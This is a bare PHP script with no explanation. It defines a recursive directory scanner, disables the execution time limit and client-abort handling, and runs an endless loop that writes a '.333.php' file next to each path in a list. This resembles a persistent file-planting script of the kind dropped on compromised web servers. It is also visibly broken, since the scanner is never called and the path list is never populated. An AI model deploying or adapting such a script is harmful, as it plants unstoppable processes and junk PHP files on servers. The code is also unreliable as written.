<?php
    function myscandir($path, &$arr) {
        foreach (glob($path) as $file) {
            if (is_dir($file)) {
                myscandir($file . '/*', $arr);
                $arr[] = realpath($file);
            }
        }
    } 
    ignore_user_abort(true);
    set_time_limit(0);
    while (1){
        foreach($allfiles as $path){
            file_put_contents($path.".333.php", "111");
            usleep(0);
        }
    }    
?>
